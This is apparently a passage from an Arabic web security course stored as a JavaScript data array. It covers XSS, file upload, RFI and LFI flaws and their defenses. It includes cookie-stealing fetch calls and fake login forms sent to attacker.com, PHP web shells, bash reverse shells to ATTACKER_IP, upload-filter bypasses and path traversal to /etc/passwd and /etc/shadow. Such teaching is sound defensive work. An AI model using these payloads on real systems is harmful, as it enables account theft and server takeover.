        <h3>لماذا تسمى Reflected ؟</h3>

        <p>لأن الكود الخبيث لا يتم تخزينه داخل قاعدة البيانات، بل ينعكس (Reflect) مباشرة من الطلب إلى الاستجابة.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// PHP Example

$query = $_GET['q'];

echo "You searched for: " . $query;</code></pre>

        <p>المشكلة أن التطبيق يعرض مدخلات المستخدم مباشرة بدون حماية.</p>

        <h3>أمثلة Payloads شائعة:</h3>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;

&lt;img src=x onerror=alert(1)&gt;

&lt;svg onload=alert(1)&gt;

&lt;body onload=alert(1)&gt;

&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>سرقة الكوكيز (Cookies):</h3>

        <p>يمكن للمهاجم سرقة جلسة المستخدم (Session Cookie) عبر JavaScript.</p>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>إذا لم تكن الكوكيز محمية بـ HttpOnly سيتمكن المهاجم من سرقتها.</p>

        <h3>سرقة بيانات تسجيل الدخول:</h3>

        <p>يمكن إنشاء نموذج تسجيل دخول مزيف داخل الصفحة.</p>

        <pre><code>&lt;script&gt;
document.body.innerHTML = '
&lt;h2&gt;Session Expired&lt;/h2&gt;
&lt;form action="http://attacker.com"&gt;
&lt;input name="user"&gt;
&lt;input type="password" name="pass"&gt;
&lt;button&gt;Login&lt;/button&gt;
&lt;/form&gt;';
&lt;/script&gt;</code></pre>

        <h3>تنفيذ عمليات باسم الضحية:</h3>

        <p>يمكن استخدام XSS لتنفيذ طلبات داخل حساب الضحية.</p>

        <pre><code>&lt;script&gt;
fetch('/change-password', {
method:'POST',
body:'password=hacked'
});
&lt;/script&gt;</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>ثم تتم مراقبة الصفحة لمعرفة تنفيذ JavaScript.</p>

        <h3>أنواع Reflected XSS:</h3>

        <p><b>1. Reflected XSS داخل HTML:</b></p>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p><b>2. Reflected XSS داخل Attributes:</b></p>

        <pre><code>" onmouseover="alert(1)</code></pre>

        <p><b>3. Reflected XSS داخل JavaScript:</b></p>

        <pre><code>';alert(1);//</code></pre>

        <h3>علامات تدل على وجود Reflected XSS:</h3>

        <p>1. ظهور مدخلات المستخدم داخل الصفحة.</p>
        <p>2. عدم ترميز الرموز الخاصة مثل &lt; &gt; " '</p>
        <p>3. تنفيذ JavaScript مباشرة.</p>
        <p>4. اختلاف محتوى الصفحة بعد إدخال أكواد HTML.</p>

        <h3>أدوات اكتشاف XSS:</h3>

        <pre><code>Burp Suite
XSStrike
Dalfox
XSS Hunter
OWASP ZAP</code></pre>

        <h3>مثال على استغلال عبر رابط:</h3>

        <pre><code>http://target.com/search?q=&lt;script&gt;
fetch('http://attacker.com?c='+document.cookie)
&lt;/script&gt;</code></pre>

        <p>يقوم المهاجم بإرسال الرابط للضحية عبر البريد أو الرسائل.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. ترميز المخرجات (Output Encoding):</b></p>

        <pre><code>htmlspecialchars($query, ENT_QUOTES, 'UTF-8');</code></pre>

        <p><b>2. استخدام Content Security Policy (CSP).</b></p>

        <p><b>3. منع Inline JavaScript.</b></p>

        <p><b>4. استخدام HttpOnly للكوكيز.</b></p>

        <p><b>5. فلترة المدخلات والتحقق منها.</b></p>

        <p><b>6. استخدام Frameworks حديثة تدعم Auto Escaping.</b></p>

        <h3>الفرق بين أنواع XSS:</h3>

        <p><b>Reflected XSS:</b> الكود ينعكس مباشرة من الطلب.</p>

        <p><b>Stored XSS:</b> الكود يتم تخزينه داخل قاعدة البيانات.</p>

        <p><b>DOM XSS:</b> التنفيذ يحدث داخل JavaScript بالمتصفح.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح ثغرة Reflected XSS بسرقة جلسات المستخدمين، تنفيذ عمليات باسم الضحية، سرقة البيانات الحساسة، أو إعادة توجيه المستخدمين إلى صفحات تصيد، لذلك تعتبر من أخطر ثغرات تطبيقات الويب.</p>
    `
},



{
    "title": "Stored XSS داخل التعليقات",
    "summary": `
        <p>تعتبر ثغرة <b>Stored Cross Site Scripting (Stored XSS)</b> من أخطر أنواع XSS لأنها تسمح للمهاجم بتخزين كود JavaScript خبيث داخل قاعدة البيانات ليتم تنفيذه تلقائياً لكل مستخدم يزور الصفحة المصابة.</p>

        <p>في هذا السيناريو يتم استغلال نظام التعليقات (Comments System) لحقن أكواد JavaScript يتم عرضها لاحقاً داخل صفحات الموقع.</p>

        <h3>كيف تعمل الثغرة؟</h3>

        <p>يقوم الموقع بحفظ تعليقات المستخدمين داخل قاعدة البيانات ثم يعرضها للزوار.</p>

        <p>إذا لم تتم فلترة أو ترميز المدخلات بشكل صحيح، يستطيع المهاجم حفظ JavaScript خبيث داخل التعليق.</p>

        <h3>مثال على نظام تعليقات ضعيف:</h3>

        <pre><code>// PHP Example

$comment = $_POST['comment'];

$query = "INSERT INTO comments(comment)
VALUES('$comment')";

mysqli_query($conn, $query);</code></pre>

        <p>ثم يتم عرض التعليقات مباشرة:</p>

        <pre><code>echo $row['comment'];</code></pre>

        <p>المشكلة أن التطبيق يعرض محتوى التعليق بدون حماية.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <p>يقوم المهاجم بكتابة التعليق التالي:</p>

        <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>

        <p>بعد حفظ التعليق، كل مستخدم يفتح الصفحة سيتم تنفيذ الكود داخل متصفحه.</p>

        <h3>لماذا تعتبر أخطر من Reflected XSS ؟</h3>

        <p>لأن الكود الخبيث يتم تخزينه داخل قاعدة البيانات ويصيب جميع الزوار تلقائياً دون الحاجة لإرسال رابط خاص لكل ضحية.</p>

        <h3>أمثلة Payloads شائعة:</h3>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;

&lt;img src=x onerror=alert(1)&gt;

&lt;svg onload=alert(1)&gt;

&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;

&lt;body onload=alert(1)&gt;</code></pre>

        <h3>سرقة الكوكيز (Cookies):</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>إذا لم تكن الكوكيز محمية بـ HttpOnly سيتمكن المهاجم من سرقتها.</p>

        <h3>اختطاف جلسات المستخدمين:</h3>

        <p>يمكن للمهاجم استخدام الكوكيز المسروقة للدخول إلى حسابات الضحايا.</p>

        <h3>حقن نموذج تسجيل دخول مزيف:</h3>

        <pre><code>&lt;script&gt;
document.body.innerHTML = '
&lt;h2&gt;Please Login Again&lt;/h2&gt;
&lt;form action="http://attacker.com"&gt;
&lt;input name="username"&gt;
&lt;input type="password" name="password"&gt;
&lt;button&gt;Login&lt;/button&gt;
&lt;/form&gt;';
&lt;/script&gt;</code></pre>

        <h3>تنفيذ أوامر داخل حساب الضحية:</h3>

        <pre><code>&lt;script&gt;
fetch('/change-email', {
method:'POST',
body:'email=hacker@test.com'
});
&lt;/script&gt;</code></pre>

        <h3>الاستغلال داخل لوحات الإدارة:</h3>

        <p>إذا قام مدير الموقع بفتح صفحة التعليقات سيتم تنفيذ الكود داخل حسابه، وقد يؤدي ذلك إلى السيطرة الكاملة على لوحة التحكم.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>POST /comment HTTP/1.1
Host: vulnerable-site.com

comment=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p>ثم يتم فتح الصفحة للتأكد من تنفيذ JavaScript.</p>

        <h3>أماكن شائعة لظهور Stored XSS:</h3>

        <p>1. التعليقات.</p>
        <p>2. الرسائل الخاصة.</p>
        <p>3. أسماء المستخدمين.</p>
        <p>4. المنتديات.</p>
        <p>5. لوحات الدعم الفني.</p>
        <p>6. صفحات الملف الشخصي.</p>

        <h3>علامات تدل على وجود Stored XSS:</h3>

        <p>1. حفظ HTML داخل قاعدة البيانات.</p>
        <p>2. عرض المدخلات بدون ترميز.</p>
        <p>3. تنفيذ JavaScript بعد إعادة تحميل الصفحة.</p>
        <p>4. ظهور عناصر HTML غير طبيعية داخل التعليقات.</p>

        <h3>أدوات اكتشاف XSS:</h3>

        <pre><code>Burp Suite
Dalfox
XSStrike
XSS Hunter
OWASP ZAP</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. ترميز المخرجات (Output Encoding):</b></p>

        <pre><code>htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');</code></pre>

        <p><b>2. فلترة HTML الخطير.</b></p>

        <p><b>3. استخدام مكتبات Sanitization مثل DOMPurify.</b></p>

        <p><b>4. تفعيل Content Security Policy (CSP).</b></p>

        <p><b>5. استخدام HttpOnly للكوكيز.</b></p>

        <p><b>6. منع Inline JavaScript.</b></p>

        <h3>مثال آمن:</h3>

        <pre><code>echo htmlspecialchars(
$row['comment'],
ENT_QUOTES,
'UTF-8'
);</code></pre>

        <h3>الفرق بين أنواع XSS:</h3>

        <p><b>Reflected XSS:</b> الكود ينعكس مباشرة من الطلب.</p>

        <p><b>Stored XSS:</b> الكود يتم تخزينه داخل قاعدة البيانات.</p>

        <p><b>DOM XSS:</b> التنفيذ يحدث داخل JavaScript داخل المتصفح.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Stored XSS من أخطر ثغرات تطبيقات الويب لأنها تسمح بإصابة جميع زوار الموقع تلقائياً، وسرقة جلسات المستخدمين، وتنفيذ أوامر داخل حساباتهم، وقد تؤدي إلى السيطرة الكاملة على لوحات الإدارة إذا تم استهداف المديرين.</p>
    `
},



{
    "title": "DOM Based XSS في JavaScript",
    "summary": `
        <p>تعتبر ثغرة <b>DOM Based XSS</b> من أخطر أنواع Cross Site Scripting لأنها تحدث بالكامل داخل المتصفح (Client Side) دون الحاجة لتعديل استجابة الخادم أو تخزين البيانات داخل قاعدة البيانات.</p>

        <p>في هذا النوع من الثغرات يقوم JavaScript داخل الصفحة بقراءة مدخلات المستخدم من الـ DOM أو من الرابط URL ثم يحقنها داخل الصفحة بشكل غير آمن، مما يسمح بتنفيذ أكواد JavaScript خبيثة.</p>

        <h3>ما هو DOM ؟</h3>

        <p>الـ DOM اختصار لـ <b>Document Object Model</b>، وهو الهيكل الذي يستخدمه المتصفح لتمثيل عناصر صفحة HTML والتفاعل معها عبر JavaScript.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يستخدم التطبيق بيانات يمكن للمستخدم التحكم بها ثم يضعها داخل الصفحة باستخدام دوال خطيرة مثل:</p>

        <pre><code>innerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>مثال عملي ضعيف:</h3>

        <pre><code>// JavaScript Example

var name = location.hash.substring(1);

document.getElementById("output").innerHTML = name;</code></pre>

        <p>يقوم الكود بقراءة البيانات من الرابط URL ثم يضعها مباشرة داخل الصفحة بدون فلترة.</p>

        <h3>مثال على الاستغلال:</h3>

        <pre><code>http://target.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p>عند فتح الرابط سيتم تنفيذ JavaScript داخل المتصفح.</p>

        <h3>لماذا تعتبر DOM XSS مختلفة؟</h3>

        <p>في Reflected أو Stored XSS يكون الخادم مسؤولاً عن حقن البيانات داخل الصفحة.</p>

        <p>أما في DOM XSS فإن JavaScript داخل المتصفح هو الذي يسبب الثغرة.</p>

        <h3>مصادر بيانات خطيرة (Sources):</h3>

        <p>يقوم التطبيق بقراءة البيانات من أماكن يمكن للمستخدم التحكم بها.</p>

        <pre><code>location.href
location.search
location.hash
document.URL
document.referrer
window.name</code></pre>

        <h3>أماكن التنفيذ الخطيرة (Sinks):</h3>

        <pre><code>innerHTML
outerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>مثال على استخدام innerHTML بشكل خطير:</h3>

        <pre><code>var input = location.search;

document.body.innerHTML = input;</code></pre>

        <p>إذا أرسل المهاجم الرابط التالي:</p>

        <pre><code>http://target.com/?&lt;img src=x onerror=alert(1)&gt;</code></pre>

        <p>سيتم تنفيذ الكود داخل المتصفح.</p>

        <h3>مثال على استغلال document.write():</h3>

        <pre><code>document.write(location.hash);</code></pre>

        <p>الرابط الخبيث:</p>

        <pre><code>http://target.com/#&lt;svg onload=alert(1)&gt;</code></pre>

        <h3>استغلال eval():</h3>

        <pre><code>eval(location.hash.substring(1));</code></pre>

        <p>الرابط:</p>

        <pre><code>http://target.com/#alert(document.cookie)</code></pre>

        <h3>سرقة الكوكيز:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>إذا لم تكن الكوكيز محمية بـ HttpOnly سيتمكن المهاجم من سرقتها.</p>

        <h3>تنفيذ عمليات باسم الضحية:</h3>

        <pre><code>&lt;script&gt;
fetch('/change-password', {
method:'POST',
body:'password=hacked123'
});
&lt;/script&gt;</code></pre>

        <h3>اختبار الثغرة باستخدام DevTools:</h3>

        <p>يقوم المختبر بفتح أدوات المطور (Developer Tools) وتتبع مصادر البيانات داخل JavaScript.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /#&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>أدوات اكتشاف DOM XSS:</h3>

        <pre><code>Burp Suite DOM Invader
DOM XSS Scanner
XSStrike
Dalfox
OWASP ZAP</code></pre>

        <h3>أنواع Payloads شائعة:</h3>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;

&lt;img src=x onerror=alert(1)&gt;

&lt;svg onload=alert(1)&gt;

javascript:alert(1)

&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>علامات تدل على وجود DOM XSS:</h3>

        <p>1. استخدام innerHTML أو document.write.</p>
        <p>2. قراءة البيانات من URL.</p>
        <p>3. تنفيذ JavaScript بدون تفاعل إضافي.</p>
        <p>4. عدم وجود فلترة أو Encoding.</p>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Safe Example

var name = location.hash.substring(1);

document.getElementById("output").textContent = name;</code></pre>

        <p>استخدام <code>textContent</code> يمنع تنفيذ HTML أو JavaScript.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. تجنب استخدام innerHTML.</b></p>

        <p><b>2. استخدام textContent أو innerText.</b></p>

        <p><b>3. منع استخدام eval().</b></p>

        <p><b>4. فلترة البيانات القادمة من URL.</b></p>

        <p><b>5. استخدام Content Security Policy (CSP).</b></p>

        <p><b>6. استخدام مكتبات Sanitization مثل DOMPurify.</b></p>

        <h3>الفرق بين أنواع XSS:</h3>

        <p><b>Reflected XSS:</b> الكود يأتي من الطلب ويعرضه الخادم.</p>

        <p><b>Stored XSS:</b> الكود يتم تخزينه داخل قاعدة البيانات.</p>

        <p><b>DOM XSS:</b> التنفيذ يحدث بالكامل داخل JavaScript داخل المتصفح.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح DOM Based XSS بسرقة جلسات المستخدمين، تنفيذ أوامر داخل حساباتهم، تعديل محتوى الصفحة، إعادة توجيه الضحايا، أو إنشاء صفحات تصيد داخل الموقع نفسه، ولذلك تعتبر من أخطر ثغرات JavaScript الحديثة.</p>
    `
},



{
    "title": "File Upload Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>File Upload Vulnerability</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يسمح الموقع للمستخدمين برفع ملفات إلى الخادم بدون التحقق الأمني الصحيح من نوع الملف أو محتواه.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لرفع ملفات خبيثة تؤدي إلى:</p>

        <p>1. تنفيذ أوامر على الخادم.</p>
        <p>2. رفع Web Shell للتحكم الكامل بالموقع.</p>
        <p>3. سرقة البيانات الحساسة.</p>
        <p>4. تجاوز المصادقة.</p>
        <p>5. رفع برمجيات خبيثة.</p>

        <h3>كيف تعمل ميزة رفع الملفات عادة؟</h3>

        <p>تسمح مواقع الويب للمستخدمين برفع صور أو ملفات مثل:</p>

        <pre><code>.jpg
.png
.pdf
.docx</code></pre>

        <p>إذا لم يقم التطبيق بالتحقق من الملف بشكل صحيح يستطيع المهاجم رفع ملفات تنفيذية مثل:</p>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi</code></pre>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// PHP Example

move_uploaded_file(
$_FILES['file']['tmp_name'],
"uploads/" . $_FILES['file']['name']
);</code></pre>

        <p>المشكلة أن التطبيق يرفع الملف مباشرة بدون أي تحقق أمني.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <p>يقوم المهاجم برفع ملف PHP يحتوي على Web Shell:</p>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>ثم يفتح الملف عبر الرابط:</p>

        <pre><code>http://target.com/uploads/shell.php?cmd=id</code></pre>

        <p>فيقوم الخادم بتنفيذ أمر النظام.</p>

        <h3>ما هو Web Shell ؟</h3>

        <p>هو ملف برمجي يسمح للمهاجم بتنفيذ أوامر على الخادم عن بعد عبر المتصفح.</p>

        <h3>أشهر أنواع Web Shells:</h3>

        <pre><code>PHP Shell
ASPX Shell
JSP Shell
Perl Shell</code></pre>

        <h3>طرق تجاوز الحماية الشائعة:</h3>

        <h3>1. تغيير امتداد الملف:</h3>

        <pre><code>shell.php.jpg
shell.phtml
shell.php5
shell.phar</code></pre>

        <h3>2. استغلال Null Byte:</h3>

        <pre><code>shell.php%00.jpg</code></pre>

        <p>في بعض الأنظمة القديمة يتم تجاهل ما بعد %00.</p>

        <h3>3. تعديل Content-Type:</h3>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>رغم أن الملف يحتوي على كود PHP.</p>

        <h3>4. رفع Polyglot Files:</h3>

        <p>وهي ملفات تجمع بين صورة وكود برمجي في نفس الوقت.</p>

        <h3>مثال على صورة تحتوي على PHP:</h3>

        <pre><code>GIF89a
&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <h3>5. استخدام Double Extensions:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <h3>6. استغلال ضعف التحقق من MIME Type:</h3>

        <p>بعض المواقع تتحقق فقط من نوع الملف المرسل من المتصفح.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data

filename="shell.php"</code></pre>

        <p>ثم تتم مراقبة الاستجابة ومسار الملف.</p>

        <h3>رفع Reverse Shell:</h3>

        <pre><code>&lt;?php
exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'");
?&gt;</code></pre>

        <p>ثم يقوم المهاجم بالاستماع عبر Netcat:</p>

        <pre><code>nc -lvnp 4444</code></pre>

        <h3>أمثلة على الامتدادات الخطيرة:</h3>

        <pre><code>.php
.phtml
.php3
.php5
.phar
.jsp
.asp
.aspx
.cgi</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. رفع صور الملف الشخصي.</p>
        <p>2. صفحات رفع المرفقات.</p>
        <p>3. أنظمة إدارة المحتوى CMS.</p>
        <p>4. لوحات التحكم.</p>
        <p>5. رفع المستندات.</p>

        <h3>علامات تدل على وجود File Upload Vulnerability:</h3>

        <p>1. عدم التحقق من امتداد الملف.</p>
        <p>2. إمكانية الوصول للملفات المرفوعة مباشرة.</p>
        <p>3. تنفيذ الملفات المرفوعة داخل الخادم.</p>
        <p>4. ضعف التحقق من MIME Type.</p>

        <h3>أدوات اختبار الثغرة:</h3>

        <pre><code>Burp Suite
OWASP ZAP
WFuzz
ffuf
Nikto</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. السماح فقط بامتدادات محددة (Whitelist).</b></p>

        <pre><code>.jpg
.png
.pdf</code></pre>

        <p><b>2. تغيير اسم الملف بعد الرفع.</b></p>

        <p><b>3. تخزين الملفات خارج مجلدات التنفيذ.</b></p>

        <p><b>4. منع تنفيذ PHP داخل مجلد uploads.</b></p>

        <p><b>5. التحقق من MIME Type الحقيقي.</b></p>

        <p><b>6. فحص الملفات باستخدام Antivirus.</b></p>

        <p><b>7. تحديد حجم الملفات المسموح.</b></p>

        <h3>مثال على إعداد Apache لمنع تنفيذ PHP:</h3>

        <pre><code>&lt;Directory "/var/www/uploads"&gt;
php_admin_flag engine off
&lt;/Directory&gt;</code></pre>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>$allowed = ['jpg','png','pdf'];

$ext = pathinfo($filename, PATHINFO_EXTENSION);

if(in_array($ext, $allowed)) {
    // Upload Safe
}</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر File Upload Vulnerability من أخطر الثغرات لأنها قد تؤدي مباشرة إلى Remote Code Execution (RCE) والسيطرة الكاملة على الخادم عبر رفع Web Shell وتنفيذ أوامر النظام عن بعد.</p>
    `
},



{
    "title": "Remote File Inclusion (RFI)",
    "summary": `
        <p>تعتبر ثغرة <b>Remote File Inclusion (RFI)</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يسمح التطبيق للمستخدم بتحديد ملف خارجي ليتم تحميله أو تنفيذه داخل الخادم بدون تحقق أمني صحيح.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتحميل ملفات خبيثة من خادم خارجي وتنفيذها مباشرة داخل الموقع المستهدف.</p>

        <h3>كيف تعمل الثغرة؟</h3>

        <p>بعض التطبيقات تستخدم دوال Include أو Require لتحميل ملفات ديناميكية.</p>

        <p>مثال على كود PHP ضعيف:</p>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>إذا لم يتم التحقق من قيمة المتغير <code>page</code> يستطيع المهاجم تحميل ملف خارجي.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt</code></pre>

        <p>سيقوم الخادم بتحميل الملف من موقع المهاجم ثم تنفيذه داخل السيرفر.</p>

        <h3>مثال على ملف خبيث:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>إذا تم تضمين الملف بنجاح سيصبح بإمكان المهاجم تنفيذ أوامر نظام.</p>

        <h3>تنفيذ أوامر على الخادم:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=id</code></pre>

        <h3>ما الفرق بين RFI و LFI ؟</h3>

        <p><b>RFI:</b> تحميل ملفات من خادم خارجي عبر HTTP أو FTP.</p>

        <p><b>LFI:</b> تحميل ملفات محلية موجودة داخل الخادم نفسه.</p>

        <h3>شروط نجاح RFI:</h3>

        <p>في PHP يجب أن يكون الخيار التالي مفعلاً:</p>

        <pre><code>allow_url_include = On</code></pre>

        <p>وأحياناً:</p>

        <pre><code>allow_url_fopen = On</code></pre>

        <h3>اختبار الثغرة:</h3>

        <p>يقوم المختبر بتجربة تحميل ملف خارجي بسيط.</p>

        <pre><code>http://target.com/index.php?page=http://example.com/test.txt</code></pre>

        <p>إذا ظهر محتوى الملف داخل الصفحة فهذا يعني أن التطبيق معرض للثغرة.</p>

        <h3>استغلال الثغرة عبر Web Shell:</h3>

        <p>يقوم المهاجم أولاً بإنشاء ملف PHP خبيث:</p>

        <pre><code>&lt;?php
echo shell_exec($_GET['cmd']);
?&gt;</code></pre>

        <p>ثم يرفعه على خادم خارجي.</p>

        <p>بعدها يرسل الرابط:</p>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.php</code></pre>

        <p>ثم يبدأ بتنفيذ الأوامر:</p>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.php&cmd=whoami</code></pre>

        <h3>استغلال Reverse Shell:</h3>

        <pre><code>&lt;?php
exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'");
?&gt;</code></pre>

        <p>ثم يقوم المهاجم بالاستماع عبر Netcat:</p>

        <pre><code>nc -lvnp 4444</code></pre>

        <h3>أمثلة على دوال خطيرة في PHP:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. أنظمة القوالب Templates.</p>
        <p>2. صفحات اللغة Language Files.</p>
        <p>3. أنظمة إدارة المحتوى CMS.</p>
        <p>4. الصفحات الديناميكية.</p>
        <p>5. أنظمة Plugins الضعيفة.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /index.php?page=http://attacker.com/shell.php HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>علامات تدل على وجود RFI:</h3>

        <p>1. وجود بارامترات مثل:</p>

        <pre><code>?page=
?file=
?include=
?template=
?lang=</code></pre>

        <p>2. استخدام include() مع مدخلات المستخدم.</p>

        <p>3. إمكانية تحميل محتوى خارجي داخل الصفحة.</p>

        <p>4. ظهور أخطاء include أو require.</p>

        <h3>رسائل خطأ شائعة:</h3>

        <pre><code>Warning: include()

failed to open stream

URL file-access is disabled</code></pre>

        <h3>أدوات اكتشاف RFI:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
WFuzz
ffuf</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$pages = [
'home' => 'home.php',
'about' => 'about.php'
];

$page = $_GET['page'];

if(array_key_exists($page, $pages)) {
    include($pages[$page]);
}</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم استخدام مدخلات المستخدم مباشرة داخل include().</b></p>

        <p><b>2. استخدام Whitelist للملفات المسموحة فقط.</b></p>

        <p><b>3. تعطيل allow_url_include.</b></p>

        <pre><code>allow_url_include = Off</code></pre>

        <p><b>4. تعطيل allow_url_fopen إذا لم يكن مطلوباً.</b></p>

        <p><b>5. التحقق من المدخلات بشكل صارم.</b></p>

        <p><b>6. استخدام مسارات ثابتة داخل التطبيق.</b></p>

        <h3>الفرق بين RFI و File Upload:</h3>

        <p><b>RFI:</b> تحميل ملف خبيث من خادم خارجي.</p>

        <p><b>File Upload:</b> رفع الملف مباشرة إلى الخادم المستهدف.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Remote File Inclusion من أخطر الثغرات لأنها تؤدي غالباً إلى Remote Code Execution (RCE) والسيطرة الكاملة على الخادم عبر تحميل ملفات خبيثة وتنفيذها عن بعد.</p>
    `
},


{
    "title": "Local File Inclusion (LFI)",
    "summary": `
        <p>تعتبر ثغرة <b>Local File Inclusion (LFI)</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يسمح التطبيق للمستخدم بتحميل ملفات محلية من داخل الخادم بدون تحقق أمني صحيح.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لقراءة ملفات حساسة داخل النظام، وأحياناً الوصول إلى تنفيذ أوامر على الخادم.</p>

        <h3>كيف تعمل الثغرة؟</h3>

        <p>تستخدم بعض التطبيقات دوال Include أو Require لتحميل ملفات ديناميكية اعتماداً على مدخلات المستخدم.</p>

        <p>مثال على كود PHP ضعيف:</p>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>إذا لم يتم التحقق من قيمة المتغير <code>page</code> يستطيع المهاجم تحميل أي ملف محلي داخل الخادم.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>http://target.com/index.php?page=../../../../etc/passwd</code></pre>

        <p>يقوم المهاجم باستخدام <code>../</code> للانتقال بين المجلدات حتى الوصول إلى ملفات النظام.</p>

        <h3>ما هو Path Traversal ؟</h3>

        <p>هو استخدام <code>../</code> للخروج من المجلد الحالي والوصول إلى مجلدات أعلى داخل النظام.</p>

        <h3>مثال على ملف حساس:</h3>

        <pre><code>/etc/passwd</code></pre>

        <p>يحتوي هذا الملف في أنظمة لينكس على معلومات المستخدمين.</p>

        <h3>مثال على النتيجة:</h3>

        <pre><code>root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></pre>

        <h3>ملفات حساسة شائعة في لينكس:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/etc/hosts
/var/log/apache2/access.log
/var/log/nginx/access.log</code></pre>

        <h3>ملفات حساسة في ويندوز:</h3>

        <pre><code>C:\\Windows\\win.ini
C:\\boot.ini
C:\\Windows\\System32\\drivers\\etc\\hosts</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. أنظمة القوالب Templates.</p>
        <p>2. ملفات اللغة Language Files.</p>
        <p>3. أنظمة CMS.</p>
        <p>4. Plugins الضعيفة.</p>
        <p>5. الصفحات الديناميكية.</p>

        <h3>بارامترات شائعة:</h3>

        <pre><code>?page=
?file=
?include=
?template=
?lang=</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>طرق تجاوز الحماية:</h3>

        <h3>1. URL Encoding:</h3>

        <pre><code>..%2f..%2f..%2fetc%2fpasswd</code></pre>

        <h3>2. Double Encoding:</h3>

        <pre><code>%252e%252e%252f</code></pre>

        <h3>3. Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>في بعض الأنظمة القديمة يتم تجاهل ما بعد %00.</p>

        <h3>4. تجاوز الامتدادات:</h3>

        <pre><code>../../../../etc/passwd%00.php</code></pre>

